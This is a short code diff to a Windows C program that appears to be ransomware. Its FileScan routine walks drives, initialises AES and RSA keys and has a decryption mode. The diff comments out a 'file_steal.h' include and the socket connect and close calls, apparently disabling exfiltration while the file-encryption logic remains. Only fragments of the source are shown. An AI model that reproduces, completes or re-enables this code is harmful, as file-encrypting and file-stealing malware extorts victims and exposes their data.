@@ -6,7 +6,7 @@
 #include <string.h>
 #include <stdbool.h>
 #include "crypto.h"
-#include "file_steal.h"
+// #include "file_steal.h"
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "advapi32.lib")
 
@@ -150,7 +150,7 @@ void FileScan(bool decryptMode) {
         return;
     }
     char* drive = drives;
-    ConnectionEstablish(&socket, &socket_addr);
+    // ConnectionEstablish(&socket, &socket_addr);
     InitializeCrypto(&hProv, &hAesKey, &hRsaKey, &keyBlob);
 
     if (decryptMode) {
@@ -263,6 +263,6 @@ void FileScan(bool decryptMode) {
         printf("Decrypt file successfully!\n");
     }
     FinalizeCrypto(&hProv, &hAesKey, &hRsaKey, &keyBlob);
-    ConnectionClose(&socket);
+    // ConnectionClose(&socket);
     getchar();
 }
